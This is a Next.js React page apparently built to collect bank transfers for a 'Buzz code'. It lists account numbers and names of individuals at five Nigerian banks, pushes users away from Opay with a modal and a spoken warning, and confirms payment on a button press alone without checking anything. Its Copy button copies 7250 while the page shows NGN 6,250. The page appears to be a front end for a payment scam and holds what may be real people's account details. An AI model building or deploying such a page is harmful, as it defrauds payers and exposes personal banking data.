"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Loader2, AlertTriangle, X, Volume2 } from "lucide-react"

const bankDetails = {
  Palmpay: {
    accountNumber: "9013549970",
    accountName: "Precious Oluebube",
  },
  Opay: {
    accountNumber: "6117408455",
    accountName: "Uchenna Solomon Abbott",
  },
  Moniepoint: {
    accountNumber: "6127834509",
    accountName: "Fatima Abdullahi",
  },
  Kuda: {
    accountNumber: "2094567831",
    accountName: "Adebayo Ogundimu",
  },
  Fairmonie: {
    accountNumber: "5673829104",
    accountName: "Aisha Mohammed",
  },
}

export default function BuyBuzzCodePayment() {
  const [userInfo, setUserInfo] = useState<{ fullName: string; email: string } | null>(null)
  const [isLoading, setIsLoading] = useState(false)
  const [selectedBank, setSelectedBank] = useState("Palmpay")
  const [showOpayWarning, setShowOpayWarning] = useState(false)
  const router = useRouter()

  useEffect(() => {
    const stored = localStorage.getItem("buzzCodePurchase")
    if (stored) {
      setUserInfo(JSON.parse(stored))
    } else {
      router.push("/buy-buzz-code")
    }

    const storedBank = localStorage.getItem("selectedBank")
    if (storedBank) {
      setSelectedBank(storedBank)
    }

    setShowOpayWarning(true)
  }, [router])

  const playVoiceWarning = () => {
    const utterance = new SpeechSynthesisUtterance(
      "Warning! Do not use Opay for payment. Opay transactions may fail or be delayed. Please select a different bank for faster processing.",
    )
    utterance.rate = 0.8
    utterance.pitch = 1
    utterance.volume = 0.8
    speechSynthesis.speak(utterance)
  }

  const handlePaymentConfirm = () => {
    setIsLoading(true)
    router.push("/buy-buzz-code/confirming-payment")
  }

  const handleChangeBank = () => {
    router.push("/buy-buzz-code/select-bank")
  }

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text)
  }

  if (!userInfo) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <Loader2 className="w-8 h-8 text-orange-600 animate-spin mx-auto mb-4" />
          <p className="text-gray-600">Loading payment details...</p>
        </div>
      </div>
    )
  }

  const currentBankDetails = bankDetails[selectedBank as keyof typeof bankDetails]

  // If currentBankDetails is undefined, default to Palmpay
  const bankDetailsToShow = currentBankDetails || bankDetails.Palmpay
  const bankNameToShow = currentBankDetails ? selectedBank : "Palmpay"

  return (
    <div className="min-h-screen bg-gray-50">
      {showOpayWarning && (
        <div className="fixed inset-0 bg-black/60 flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-xl p-6 max-w-sm mx-auto relative shadow-2xl border">
            <button
              onClick={() => setShowOpayWarning(false)}
              className="absolute right-4 top-4 text-gray-400 hover:text-gray-600 transition-colors"
            >
              <X className="w-6 h-6" />
            </button>

            <div className="text-center">
              <div className="w-20 h-20 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
                <AlertTriangle className="w-10 h-10 text-red-600" />
              </div>

              <h3 className="text-xl font-bold text-red-600 mb-3">⚠️ PAYMENT WARNING!</h3>

              <p className="text-gray-700 mb-6 text-sm leading-relaxed">
                <strong className="text-red-600">Do not use Opay for payment!</strong>
                <br />
                <br />
                Opay transactions frequently fail or experience significant delays. For faster and more reliable
                processing, please select a different bank.
              </p>

              <div className="flex items-center justify-center mb-6">
                <button
                  onClick={playVoiceWarning}
                  className="flex items-center gap-2 bg-blue-100 text-blue-700 px-4 py-2 rounded-lg font-medium text-sm hover:bg-blue-200 transition-colors"
                >
                  <Volume2 className="w-4 h-4" />
                  Play Voice Notice
                </button>
              </div>

              <div className="space-y-3">
                <button
                  onClick={handleChangeBank}
                  className="w-full bg-green-600 text-white py-3 rounded-lg font-semibold text-sm hover:bg-green-700 transition-colors"
                >
                  Select Different Bank
                </button>

                <button
                  onClick={() => setShowOpayWarning(false)}
                  className="w-full bg-gray-200 text-gray-700 py-3 rounded-lg font-semibold text-sm hover:bg-gray-300 transition-colors"
                >
                  I Understand, Continue
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      <div className="max-w-sm mx-auto bg-white min-h-screen">
        {/* Header with logo and amount */}
        <div className="flex items-center justify-between p-4 border-b">
          <div className="w-12 h-12 bg-blue-600 rounded-full flex items-center justify-center">
            <div className="w-6 h-6 border-2 border-orange-400 rounded-full"></div>
          </div>
          <div className="text-right">
            <div className="text-xl font-bold">NGN 6,250</div>
            <div className="text-sm text-gray-600">{userInfo.email}</div>
          </div>
        </div>

        <div className="p-4">
          <h2 className="text-base font-medium text-center mb-4">Complete this bank transfer to proceed</h2>

          <div className="mb-3">
            <div className="flex justify-between items-center mb-1">
              <span className="text-gray-600 text-sm">Selected Bank:</span>
              <button onClick={handleChangeBank} className="text-blue-600 text-sm underline">
                Change Bank
              </button>
            </div>
            <div className={`text-base font-semibold ${selectedBank === "Opay" ? "text-red-600" : "text-blue-600"}`}>
              {bankNameToShow}
              {selectedBank === "Opay" && <span className="text-red-500 ml-2">⚠️</span>}
            </div>
          </div>

          {selectedBank === "Opay" && (
            <div className="bg-red-50 border border-red-200 rounded-lg p-3 mb-4">
              <div className="flex items-center">
                <AlertTriangle className="w-4 h-4 text-red-600 mr-2" />
                <span className="text-red-700 text-sm font-medium">Opay payments may be delayed!</span>
              </div>
            </div>
          )}

          <div className="bg-gray-50 rounded-lg p-3 space-y-3">
            <div className="flex justify-between items-center">
              <span className="text-gray-600 text-sm">Amount</span>
              <button
                onClick={() => copyToClipboard("7250")}
                className="bg-orange-500 text-white px-2 py-1 rounded text-xs"
              >
                Copy
              </button>
            </div>
            <div className="text-lg font-bold">NGN 6,250</div>

            <div className="flex justify-between items-center">
              <div className="flex items-center">
                <div className="w-5 h-5 bg-gray-400 rounded mr-2 flex items-center justify-center text-white text-xs">
                  12
                </div>
                <span className="text-gray-600 text-sm">Account Number</span>
              </div>
              <button
                onClick={() => copyToClipboard(bankDetailsToShow.accountNumber)}
                className="bg-orange-500 text-white px-2 py-1 rounded text-xs"
              >
                Copy
              </button>
            </div>
            <div className="text-lg font-bold">{bankDetailsToShow.accountNumber}</div>

            <div className="flex items-center mb-1">
              <div className="w-5 h-5 bg-yellow-500 rounded mr-2 flex items-center justify-center text-white text-xs">
                🏦
              </div>
              <span className="text-gray-600 text-sm">Bank Name</span>
            </div>
            <div className="text-base font-semibold">{bankNameToShow}</div>

            <div className="flex items-center mb-1">
              <div className="w-5 h-5 bg-blue-500 rounded-full mr-2 flex items-center justify-center text-white text-xs">
                i
              </div>
              <span className="text-gray-600 text-sm">Account Name</span>
            </div>
            <div className="text-base font-semibold">{bankDetailsToShow.accountName}</div>

            <div className="text-xs text-gray-600 mt-3 leading-relaxed">
              Transfer the exact amount to the account above. You will get your Buzz code automatically after payment
              confirmation. Use (500222) as the transfer description for faster processing.
            </div>

            <button
              onClick={handlePaymentConfirm}
              disabled={isLoading}
              className="w-full bg-orange-500 text-white py-2.5 rounded-lg font-medium mt-4 text-sm"
            >
              {isLoading ? "Processing..." : "I have made this bank Transfer"}
            </button>
          </div>
        </div>
      </div>
    </div>
  )
}
